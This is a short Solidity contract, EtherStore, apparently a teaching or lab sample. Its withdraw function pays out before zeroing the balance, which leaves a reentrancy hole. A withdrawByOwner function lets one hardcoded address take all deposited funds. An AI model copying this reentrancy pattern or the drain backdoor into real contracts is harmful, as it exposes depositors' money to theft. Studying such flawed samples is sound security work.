//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

contract EtherStore {

    constructor() payable {}
    
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdrawByOwner() external {
        require(msg.sender == 0xCDC2932B27102912b677b3838442e1901B87273d);
        msg.sender.call{value: address(this).balance}("");
    }
}